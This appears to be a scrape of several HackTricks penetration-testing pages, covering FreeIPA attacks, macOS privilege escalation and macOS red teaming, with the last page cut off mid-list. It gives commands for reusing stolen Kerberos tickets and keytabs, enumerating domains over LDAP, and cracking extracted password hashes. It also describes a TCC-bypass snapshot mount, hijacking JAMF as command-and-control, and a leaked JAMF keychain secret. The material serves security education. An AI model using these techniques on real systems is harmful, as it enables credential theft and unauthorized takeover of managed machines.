handle\nmulti-factor\nauthentication, including smartcards. SSSD is used to integrate FreeIPA into the standard Unix authentication process.\nFingerprints\nFiles & Env Vars\n/etc/krb5.conf\n:\nThe\nkrb5.conf\nfile contains the Kerberos client information required to be\nenrolled in the domain\n. This includes the\nlocations of KDCs and admin\nservers for the Kerberos realms of interest, defaults for the current realm and for Kerberos applications, and mappings of hostnames onto Kerberos realms.\n/etc/ipa/default.conf\n:\nThis is the\ndefault configuration file for IPA servers\n, it is used to set system-wide defaults to be applied when running IPA clients and servers.\n/etc/krb5.keytab\n:\nThe\nkrb5.keytab\nfile is\nrequired\non all hosts inside of the\ndomain\n. It is required as part of the\nauthentication\nprocess to the KDC.\nKRB5CCNAME\n:\nIf set, this variable points to the\nlocation of the CCACHE Ticket\nto be used for authentication.\nKRB5_KTNAME\n:\nIf set, this variable points to the\nlocation\nof the\nKeytab\nfile to be used for authentication.\nKRB5_CONFIG\n:\nIf set, this variable points to the\nlocation\nof the\nKerberos configuration\nfile.\nKRB5_KDC_PROFILE\n:\nIf set, this variable points to the\nlocation of the KDC configuration\nfile, which contains additional configuration directives for the Key Distribution Center daemon.\nKRB5RCACHETYPE\n:\nThis variable specifies the\ndefault type of replay cache\nto use for servers.\nKRB5RCACHEDIR\n:\nThis variable specifies the\ndefault directory for replay caches\nused by servers.\nKRB5_TRACE\n:\nThis variable specifies a\nfilename to write trace log output to\n. Trace logs can help illuminate decisions made internally by the Kerberos libraries.\nKRB5_CLIENT_KTNAME\n:\nThis variable sets the\ndefault client keytab\nfile name.\nKPROP_PORT\n:\nThis variable sets the\ndefault port for kprop\nto use.\nBinaries\nipa:\nThis binary is the standard for\nmanaging a FreeIPA domain\n. It can be used to manage hosts, users, sudo rules, and much more.\nkdestroy:\nThe kdestroy binary is used to\ndestroy\nany current\nKerberos\ntickets\nin the users session.\nkinit:\nThe kinit binary is used to\nestablish\n, or\nrenew\nKerberos tickets\n.\nklist:\nThe klist binary\nlists\nany current\nKerberos tickets in use\n, and which principals the tickets provide access to.\nkpasswd:\nThe kpasswd command is used to\nchange a Kerberos principal‚Äôs password\n. kpasswd first prompts for the current Kerberos password, then prompts the user twice for the new password, and the password is changed.\nksu:\nKsu can be used as an\nalternative to the su binary\n, to switch the current\nuser context\n.\nkswitch:\nThe kswitch command will\nswitch\nthe current\ncredential cache in use\n.\nkvno:\nThe kvno binary acquires a\nservice ticket\nfor the\nspecified Kerberos\nprincipals and prints out the key version numbers of each.\nNetwork\nThis is how a FreeIPA server might look like:\nAuthentication\nSince FreeIPA uses\nKerberos for authentication\n, this process is very similar to\nauthentication\nin\nActive Directory\n. In order to\naccess\nresources on the domain, a user must have a v\nalid Kerberos ticket\nfor that resource. These tickets can be stored in a number of different locations based on the configuration of the FreeIPA domain.\nCCACHE Ticket Files\nWhen tickets are set to be\nstored\nas a\nfile\non\ndisk\n, the standard format and type is a\nCCACHE\nfile. This is a simple binary file format to store Kerberos credentials. These files are typically stored in\n/tmp\nand scoped with\n600\npermissions. From an attackers perspective this is important for the following reasons:\n1.\nValid tickets can be\nutilized to authenticate\n,\nwithout\nthe need of the respective users plaintext\npassword\n.\n2.\nCCACHE\ntickets are highly\nportable\n. They can be downloaded and loaded onto another host without the need to renew, or validate the ticket.\nParsing\na CCACHE Ticket is easily accomplished a number of different ways. The simplest method is parsing it with the klist binary.\nklist /tmp/krb5cc_0\nFor an attacker re-using a CCACHE Ticket is very easy. To\nre-use\na valid CCACHE Ticket,\nexport\nKRB5CCNAME\nto the\npath\nof the valid ticket file. The system should recognize the environment variable and will attempt to use that credential material when interacting with the domain.\nexport\nKRB5CCNAME\n=\n/tmp/krb5cc_0\nklist\nUnix Keyring\nCCACHE Tickets **** can also be\nstored\nin **** the Linux\nkeyring\n. The keyring lives inside of the\nkernel\n, and gives administrators\nmore control over the retrieval and use of stored tickets\n. Tickets can be scoped in the following different ways:\nKEYRING:name\n:\nTickets are scoped to a specific named Keyring.\nKEYRING:process:name\n:\nTickets are scoped to a specific process id.\nKEYRING:thread:name\n:\nTickets are scoped to a specific thread.\nKEYRING:session:name\n:\nTickets are scoped to a specific user session.\nKEYRING:persistent:uidnumber\n:\nTickets are scoped to a specific user regardless of session (default).\nDepending on how the administrator scoped the ticket stored inside of the Unix keyring, parsing it out may be difficult. However, the\ndefault\nscope\nfor CCACHE Tickets in the Unix keyring is\nKEYRING:persistent:uidnumber\n. Fortunately if you are in the\ncontext\nof the\nuser\n,\nklist\ncan\nparse\nthis information for us.\nAs an attacker,\nre-using a CCACHE\nTicket stored in the Unix\nkeyring\nis fairly\ndifficult\ndepending on how the ticket is scoped. Fortunately\n@Zer1t0\nfrom\n@Tarlogic\nhas built a tool that can extract Kerberos tickets from the Unix keyring. The tool is called\nTickey\nand can be found\nhere\n.\nKeytab\nusually, each host is deployed with a keytab credential for that host that can be used to obtain a valid Credential Cache(CCACHE) Ticket Granting Ticket(TGT) for the host itself.\nIt consists of pairs of\nKerberos principals and encrypted keys\nthat are derived from the Kerberos password associated with the principal. Since these keys are derived from the principal‚Äôs password, if that\npassword changes the keytab will be invalidated\n.\nKeytab files can be used to\nobtain a valid ticket granting ticket\n(TGT) for the principal it is scoped to. This authentication process\ndoes not require the password\n, as it contains keys derived from the password.\nParsing a Keytab file is very easy, and can be accomplished a few ways. The easiest way to\nparse\na\nkeytab\nfile is with\nklist\n. The second way utilizes a great python utility that\nCody Thomas\nhas created. His ****\nKeytabParser\n**** project will parse out the principal and its relevant encrypted keys.\nAttackers can\nre-use credentials stored in keytab files by generating a CCACHE Ticket\nthrough the kinit binary.\n# Parse keytab\nklist\n-\nk\n/\nrtc/krb5\n.\nkeytab\n‚Äã\n# Get TGT\nkinit\n-\nkt\n/\netc/krb5\n.\nkeytab host/bastion\n.\nwesteros\n.\nlocal@WESTEROS\n.\nLOCAL\nCheatsheet\nYou can find more information about how to use tickets in linux in the following link:\nLinux Active Directory\nEnumeration\nYou could perform the\nenumeration\nvia\nldap\nand other\nbinary\ntools, or\nconnecting to the web page in the port 443 of the FreeIPA server\n.\nHosts, Users, and Groups\nIt's possible to create\nhosts\n,\nusers\nand\ngroups\n. Hosts and users are sorted into containers called ‚Äú\nHost Groups\n‚Äù and ‚Äú\nUser Groups\n‚Äù respectively. These are similar to\nOrganizational Units\n(OU).\nBy default in FreeIPA, the LDAP server allows for\nanonymous binds\n, and a large swath of data is enumerable\nunauthenticated\n. This can enumerate all data available unauthenticated:\nldapsearch -x\nTo get\nmore information\nyou need to use an\nauthenticated\nsession (check the Authentication section to learn how to prepare an authenticated session).\n# Get all users of domain\nldapsearch\n-Y\ngssapi\n-b\n\"cn=users,cn=compat,dc=domain_name,dc=local\"\n‚Äã\n# Get users groups\nldapsearch\n-Y\ngssapi\n-b\n\"cn=groups,cn=accounts,dc=domain_name,dc=local\"\n‚Äã\n# Get all the hosts\nldapsearch\n-Y\ngssapi\n-b\n\"cn=computers,cn=accounts,dc=domain_name,dc=local\"\n‚Äã\n# Get hosts groups\nldapsearch\n-Y\ngssapi\n-b\n\"cn=hostgroups,cn=accounts,dc=domain_name,dc=local\"\nFrom a domain joined machine you will be able to use\ninstalled binaries\nto enumerate the domain:\nipa user-find\nipa usergroup-find\nipa host-find\nipa host-group-find\n‚Äã\n-------------------\n‚Äã\nipa user-show\n<\nusername\n>\n--all\nipa usergroup-show\n<\nuser group\n>\n--all\nipa host-find\n<\nhost\n>\n--all\nipa hostgroup-show\n<\nhost group\n>\n--all\nThe\nadmin\nuser of\nFreeIPA\nis the equivalent to\ndomain admins\nfrom\nAD\n.\nHashes\nThe\nroot\nuser from the\nIPA serve\nr has access to the password\nhashes\n.\nThe password hash of a user is stored as\nbase64\nin the ‚Äú\nuserPassword\n‚Äù\nattribute\n. This hash might be\nSSHA512\n(old versions of FreeIPA) or\nPBKDF2_SHA256\n.\nThe\nNthash\nof the password store as\nbase64\nin ‚Äú\nipaNTHash\n‚Äù if system has\nintegration\nwith\nAD\n.\nTo crack these hashes:\n‚Ä¢ If freeIPA integrated with AD,\nipaNTHash\nis easy to crack: You should\ndecode\nbase64\n-> re-encoded it as\nASCII\nhex -> John The Ripper or\nhashcat\ncan help you to crack it fast\n‚Ä¢ If an old version of FreeIPA is used, so\nSSHA512\nis used: You should decode\nbase64\n-> find SSHA512\nhash\n-> John The Ripper or\nhashcat\ncan help you to crack it\n‚Ä¢ If new version of FreeIPA is used, so\nPBKDF2_SHA256\nis used: You should decode\nbase64\n-> find PBKDF2_SHA256 -> it‚Äôs\nlength\nis 256 byte. John can work with 256 bits (32 byte) -> SHA-265 used as the pseudo-random function, block size is 32 byte -> you can use only first 256 bit of our PBKDF2_SHA256 hash -> John The Ripper or hashcat can help you to crack it\nTo extract the hashes you need to be\nroot in the FreeIPA server\n, there you can use the tool\ndbscan\nto extract them:\nHBAC-Rules\nThere are the rules that grant specific permissions to users or hosts over resources (hosts, services, service groups...)\n# Enumerate using ldap\nldapsearch\n-Y\ngssapi\n-b\n\"cn=hbac,dc=domain_name,dc=local\"\n# Using ipa\nipa hbacrule-find\n# Show info of rule\nipa hbacrule-show\n<\nhbacrule\n>\n--all\nSudo-Rules\nFreeIPA provides the ability to\nmanage sudo permissions\nfrom one\ncentralized\nsource through sudo-rules. These rulesets can be used to restrict or delegate the ability to\nexecute commands as sudo\non hosts enrolled in the domain. As an attacker we can enumerate which hosts and users these rulesets are applied too, and which commands are allowed through the ruleset.\n# Enumerate using ldap\nldapsearch\n-Y\ngssapi\n-b\n\"cn=sudorules,cn=sudo,dc=domain_name,dc=local\"\n# Using ipa\nipa sudorule-find\n# Show info of rule\nipa sudorule-show\n<\nsudorule\n>\n--all\nRole-Based Access Control\nEach\nrole\ncontains a set of\nprivileges\n, and those respective privileges contain a\nset\nof\npermissions\n. Roles can be\napplied to Users\n, User\nGroups\n,\nHosts\n, Host Groups, and Services. To illustrate this concept let‚Äôs discuss the default ‚ÄúUser Administrator‚Äù role in FreeIPA.\nAs the screenshot above shows the ‚ÄúUser Administrator‚Äù role contains the following privileges:\nUser Administrators\nGroup Administrators\nStage User Administrators\nWe can drill down further and enumerate the\npermissions\ndelegated to each\nprivilege\n:\nAs we can see the ‚Äú\nUser Administrator\n‚Äù role contains quite\na lot of permissions\ninside of the environment. Understanding the general concept and structure of\nroles\n,\nprivileges\n, and\npermissions\ncan be critical to identifying attack paths throughout an environment.\n# Using ldap\nldapsearch\n-Y\ngssapi\n-b\n\"cn=roles,cn=accounts,dc=westeros,dc=local\"\n# Using ipa binary\nipa role-find\nipa role-show\n<\nrole\n>\n--all\nipa privilege-find\nipa privilege-show\n<\nprivilege\n>\n--all\nipa permission-find\nipa permission-show\n<\npermission\n>\n--all\nAttack Scenario Example\nIn\nhttps://posts.specterops.io/attacking-freeipa-part-iii-finding-a-path-677405b5b95e\nyou can find a simple example of how to abuse some permissions to compromise the domain.\nLinikatz\n‚Äã\nhttps://github.com/CiscoCXSecurity/linikatz\n‚Äã\nPrivesc\nroot user creation\nIf you can\ncreate a new user with the name\nroot\n, you can impersonate him and you will be able to\nSSH into any machine as root.\nTHIS HAS BEEN PATCHED.\nThe \"\nUser Administrators\n\" privilege, is very powerful (as its name indicates it):\nWith this privilege comes a lot of different power to affect users inside the environment. Using this privilege we can\nmake a new user inside the FreeIPA domain named _root\n._\nOnce the user is created in the domain we can\nobtain a ticket for the account with _kinit\n_.\nNow we can attempt to\nSSH\nusing our newly created root domain account.\nAs shown this\ndrops the user into the local root account\n! So simply by creating a domain user for a local user we were able to authenticate using the\n[email¬†protected]\naccount and obtain the\nuser context of the local root account\n.\nFor more details about this vuln check\nhttps://posts.specterops.io/attacking-freeipa-part-iv-cve-2020-10747-7c373a1bf66b\n\\\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nPAM - Pluggable Authentication Modules\nNext\n- MacOS Hardening\nmacOS Security & Privilege Escalation\nLast modified\n6mo ago"
    },
    {
        "title": "macOS Security & Privilege Escalation",
        "url": "https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation",
        "text": "macOS Security & Privilege Escalation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nBasic MacOS\nIf you are not familiar with macOS, you should start learning the basics of macOS:\nSpecial macOS\nfiles & permissions:\nmacOS Files, Folders, Binaries & Memory\nCommon macOS\nusers\nmacOS Users\nAppleFS\nmacOS AppleFS\nThe\narchitecture\nof the k\nernel\nmacOS Kernel & System Extensions\nCommon macOS n\network services & protocols\nmacOS Network Services & Protocols\nOpensource\nmacOS:\nhttps://opensource.apple.com/\n‚Äã\nTo download a\ntar.gz\nchange a URL such as\nhttps://opensource.apple.com/\nsource\n/dyld/\nto\nhttps://opensource.apple.com/\ntarballs\n/dyld/\ndyld-852.2.tar.gz\n‚Äã\nMacOS MDM\nIn companies\nmacOS\nsystems are highly probably going to be\nmanaged with a MDM\n. Therefore, from the perspective of an attacker is interesting to know\nhow that works\n:\nmacOS MDM\nMacOS - Inspecting, Debugging and Fuzzing\nmacOS Apps - Inspecting, debugging and Fuzzing\nMacOS Security Protections\nmacOS Security Protections\nAttack Surface\nFile Permissions\nIf a\nprocess running as root writes\na file that can be controlled by a user, the user could abuse this to\nescalate privileges\n.\nThis could occur in the following situations:\nFile used was already created by a user (owned by the user)\nFile used is writable by the user because of a group\nFile used is inside a directory owned by the user (the user could create the file)\nFile used is inside a directory owned by root but user has write access over it because of a group (the user could create the file)\nBeing able to\ncreate a file\nthat is going to be\nused by root\n, allows a user to\ntake advantage of its content\nor even create\nsymlinks/hardlinks\nto point it to another place.\nFor this kind of vulnerabilities don't forget to\ncheck vulnerable\n.pkg\ninstallers\n:\nmacOS Installers Abuse\nEntitlements and Privileges abuse via process abuse\nIf a process can\ninject code in another process with better privileges or entitlements\nor contact it to perform privileges actions, he could escalate privileges and bypass defensive meassures such as\nSandbox\nor\nTCC\n.\nmacOS Proces Abuse\nFile Extension & URL scheme app handlers\nWeird apps registered by file extensions could be abused and different applications can be register to open specific protocols\nmacOS File Extension & URL scheme app handlers\nMacOS Privilege Escalation\nCVE-2020-9771 - mount_apfs TCC bypass and privilege escalation\nAny user\n(even unprivileged ones) can create and mount a time machine snapshot an\naccess ALL the files\nof that snapshot.\nThe\nonly privileged\nneeded is for the application used (like\nTerminal\n) to have\nFull Disk Access\n(FDA) access (\nkTCCServiceSystemPolicyAllfiles\n) which need to be granted by an admin.\n# Create snapshot\ntmutil localsnapshot\n‚Äã\n# List snapshots\ntmutil listlocalsnapshots /\nSnapshots\nfor\ndisk /:\ncom.apple.TimeMachine.2023-05-29-001751.local\n‚Äã\n# Generate folder to mount it\ncd\n/tmp\n# I didn it from this folder\nmkdir\n/tmp/snap\n‚Äã\n# Mount it, \"noowners\" will mount the folder so the current user can access everything\n/sbin/mount_apfs\n-o\nnoowners\n-s\ncom.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap\n‚Äã\n# Access it\nls\n/tmp/snap/Users/admin_user\n# This will work\nA more detailed explanation can be\nfound in the original report\n.\nSensitive Information\nmacOS Sensitive Locations\nLinux Privesc\nFirst of all, please note that\nmost of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS\nmachines. So see:\nLinux Privilege Escalation\nReferences\n‚Äã\nOS X Incident Response: Scripting and Analysis\n‚Äã\n‚Äã\nhttps://taomm.org/vol1/analysis.html\n‚Äã\n‚Äã\nhttps://github.com/NicolasGrimonpont/Cheatsheet\n‚Äã\n‚Äã\nhttps://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ\n‚Äã\n‚Äã\nhttps://www.youtube.com/watch?v=vMGiplQtjTY\n‚Äã\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nLinux Hardening -\nPrevious\nFreeIPA Pentesting\nNext\nmacOS Apps - Inspecting, debugging and Fuzzing\nLast modified\n18d ago"
    },
    {
        "title": "macOS Red Teaming",
        "url": "https://book.hacktricks.xyz/macos-hardening/macos-red-teaming",
        "text": "macOS Red Teaming\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nAbusing MDMs\nJAMF Pro:\njamf checkJSSConnection\nKandji\nIf you manage to\ncompromise admin credentials\nto access the management platform, you can\npotentially compromise all the computers\nby distributing your malware in the machines.\nFor red teaming in MacOS environments it's highly recommended to have some understanding of how the MDMs work:\nmacOS MDM\nUsing MDM as a C2\nA MDM will have permission to install, query or remove profiles, install applications, create local admin accounts, set firmware password, change the FileVault key...\nIn order to run your own MDM you need to\nyour CSR signed by a vendor\nwhich you could try to get with\nhttps://mdmcert.download/\n. And to run your own MDM for Apple devices you could use\nMicroMDM\n.\nHowever, to install an application in an enrolled device, you still need it to be signed by a developer account... however, upon MDM enrolment the\ndevice adds the SSL cert of the MDM as a trusted CA\n, so you can now sign anything.\nTo enrol the device in a MDM you. need to install a\nmobileconfig\nfile as root, which could be delivered via a\npkg\nfile (you could compress it in zip and when downloaded from safari it will be decompressed).\nMythic agent Orthrus\nuses this technique.\nAbusing JAMF PRO\nJAMF can run\ncustom scripts\n(scripts developed by the sysadmin),\nnative payloads\n(local account creation, set EFI password, file/process monitoring...) and\nMDM\n(device configurations, device certificates...).\nJAMF self-enrolment\nGo to a page such as\nhttps://<company-name>.jamfcloud.com/enroll/\nto see if they have\nself-enrolment enabled\n. If they have it might\nask for credentials to access\n.\nYou could use the script\nJamfSniper.py\nto perform a password spraying attack.\nMoreover, after finding proper credentials you could be able to brute-force other usernames with the next form:\n‚Äã\n‚Äã\nJAMF device Authentication\nThe\njamf\nbinary contained the secret to open the keychain which at the time of the discovery was\nshared\namong everybody and it was:\njk23ucnq91jfu9aj\n.\nMoreover, jamf\npersist\nas a\nLaunchDaemon\nin\n/Library/LaunchAgents/com.jamf.management.agent.plist\nJAMF Device Takeover\nThe\nJSS\n(Jamf Software Server)\nURL\nthat\njamf\nwill use is located in\n/Library/Preferences/com.jamfsoftware.jamf.plist\n. \nThis file basically contains the URL:\nplutil\n-convert\nxml1\n-o\n- /Library/Preferences/com.jamfsoftware.jamf.plist\n‚Äã\n[..\n.\n]\n<\nkey\n>\nis_virtual_machine\n<\n/key\n>\n<\nfalse/\n>\n<\nkey\n>\njss_url\n<\n/key\n>\n<\nstring\n>\nhttps://halbornasd.jamfcloud.com/\n<\n/string\n>\n<\nkey\n>\nlast_management_framework_change_id\n<\n/key\n>\n<\ninteger\n>\n4\n<\n/integer\n>\n[..\n.\n]\nSo, an attacker could drop a malicious package (\npkg\n) that\noverwrites this file\nwhen installed setting the\nURL to a Mythic C2 listener from a Typhon agent\nto now be able to abuse JAMF as C2.\n# After changing the URL you could wait for it to be reloaded or execute:\nsudo\njamf policy\n-id\n0\n‚Äã\n# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2\nJAMF Impersonation\nIn order to\nimpersonate the communication\nbetween a device and JMF you need:\nThe\nUUID\nof the device:\nioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}'\nThe\nJAMF keychain\nfrom:\n/Library/Application\\ Support/Jamf/JAMF.keychain\nwhich contains the device certificate\nWith this information,\ncreate a VM\nwith the\nstolen\nHardware\nUUID\nand with\nSIP disabled\n, drop the\nJAMF keychain,\nhook\nthe Jamf\nagent\nand steal its information.\nSecrets stealing\na\nYou could also monitor the location\n/Library/Application Support/Jamf/tmp/\nfor the\ncustom scripts\nadmins might want to execute via Jamf as they are\nplaced here, executed and removed\n. These scripts\nmight contain credentials\n.\nHowever,\ncredentials\nmight be passed tho these scripts as\nparameters\n, so you would need to monitor\nps aux | grep -i jamf\n(without even being root).\nThe script\nJamfExplorer.py\ncan listen for new files being added and new process arguments.\nmacOS Remote Access\nAnd also about\nMacOS\n\"special\"\nnetwork\nprotocols\n:\nmacOS Network Services & Protocols\nActive Directory\nIn some occasions you will find that the\nMacOS computer is connected to an AD\n. In this scenario you should try to\nenumerate\nthe active directory as you are use to it. Find some\nhelp\nin the following pages:\n389, 636, 3268, 3269 - Pentesting LDAP\nActive Directory Methodology\n88tcp/udp - Pentesting Kerberos\nSome\nlocal MacOS tool\nthat may also help you is\ndscl\n:\ndscl\n\"/Active Directory/[Domain]/All Domains\"\nls\n/\nAlso there are some tools prepared for MacOS to automatically enumerate the AD and play with kerberos:\n‚Äã\nMachound\n: MacHound is an extension to the Bloodhound audting tool allowing collecting and ingesting of Active Directory relationships on MacOS hosts.\n‚Äã\nBifrost\n: Bifrost is an Objective-C project designed to interact with the Heimdal krb5 APIs on macOS. The goal of the project is to enable better security testing around Kerberos on macOS devices using native APIs without requiring any other framework or packages on the target.\n‚Äã\nOrchard\n: JavaScript for Automation (JXA) tool to do Active Directory enumeration.\nDomain Information\necho\nshow com.apple.opendirectoryd.ActiveDirectory\n|\nscutil\nUsers\nThe three types of MacOS users are:\nLocal Users\n‚Äî Managed by the local OpenDirectory service, they aren‚Äôt connected in any way to the Active Directory.\nNetwork Users\n‚Äî Volatile Active Directory users who require a connection to the DC server to authenticate.\nMobile Users\n‚Äî Active Directory users with a local backup for their credentials and files.\nThe local information about users and groups is stored in in the folder\n/var/db/dslocal/nodes/Default.\nFor example, the info about user called\nmark\nis stored in\n/var/db/dslocal/nodes/Default/users/mark.plist\nand the info about the group\nadmin\nis in\n/var/db/dslocal/nodes/Default/groups/admin.plist\n.\nIn addition to using the HasSession and AdminTo edges,\nMacHound adds three new edges\nto the Bloodhound database:\nCanSSH\n- entity allowed to SSH to host\nCanVNC\n- entity allowed to VNC to host\nCanAE\n- entity allowed to execute AppleEvent scripts on host\n#User enumeration\ndscl\n.\nls\n/Users\ndscl\n.\nread\n/Users/\n[\nusername\n]\ndscl\n\"/Active Directory/TEST/All Domains\"\nls\n/Users\ndscl\n\"/Active Directory/TEST/All Domains\"\nread\n/Users/\n[\nusername\n]\ndscacheutil\n-q\nuser\n‚Äã\n#Computer enumeration\ndscl\n\"/Active Directory/TEST/All Domains\"\nls\n/Computers\ndscl\n\"/Active Directory/TEST/All Domains\"\nread\n\"/Computers/[compname]$\"\n‚Äã\n#Group enumeration\ndscl\n.\nls\n/Groups\ndscl\n.\nread\n\"/Groups/[groupname]\"\ndscl\n\"/Active Directory/TEST/All Domains\"\nls\n/Groups\ndscl\n\"/Active Directory/TEST/All Domains\"\nread\n\"/Groups/[groupname]\"\n‚Äã\n#Domain Information\ndsconfigad\n-show\nMore info in\nhttps://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/\n‚Äã\nAccessing the Keychain\nThe Keychain highly probably contains sensitive information that if accessed withuot generating a prompt could help to move forward a red team exercise:\nmacOS Keychain\nExternal Services\nMacOS Red Teaming is different from a regular Windows Red Teaming as usually\nMacOS is integrated with several external platforms directly\n. A common configuration of MacOS is to access to the computer using\nOneLogin synchronised credentials, and accessing several external services\n(like github, aws...) via OneLogin:\nMisc Red Team techniques\nSafari\nWhen a file is downloaded in Safari, if its a \"safe\" file, it will be\nautomatically opened\n. So for example, if you\ndownload a zip\n, it will be automatically decompressed:\nReferences\n‚Äã\nhttps://www.youtube.com/watch?v=IiMladUbL6E\n‚Äã\n‚Äã\nhttps://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6\n‚Äã\n‚Äã\nhttps://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0\n‚Äã\n‚Äã\nCome to the Dark Side, We Have Apples: Turning macOS Management Evil\n‚Äã\n‚Äã\nOBTS v3.0: \"An Attackers Perspective on Jamf Configurations\" - Luke Roberts / Calum Hall\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nmacOS Users\nNext\nmacOS MDM\nLast modified\n5mo ago"
    },
    {
        "title": "macOS Useful Commands",
        "url": "https://book.hacktricks.xyz/macos-hardening/macos-useful-commands",
        "text": "macOS Useful Commands\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMacOS Automatic Enumeration Tools\nMacPEAS\n:\nhttps://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\n‚Äã\nMetasploit\n:\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/post/osx/gather/enum_osx.rb\n‚Äã\nSwiftBelt\n:\nhttps://github.com/cedowens/SwiftBelt\n‚Äã\nSpecific MacOS Commands\n#System info\ndate\ncal\nuptime\n#show time from starting\nw\n#list users\nwhoami\n#this user\nfinger username\n#info about user\nuname\n-a\n#sysinfo\ncat\n/proc/cpuinfo\n#processor\ncat\n/proc/meminfo\n#memory\nfree\n#check memory\ndf\n#check disk\n‚Äã\nlaunchctl 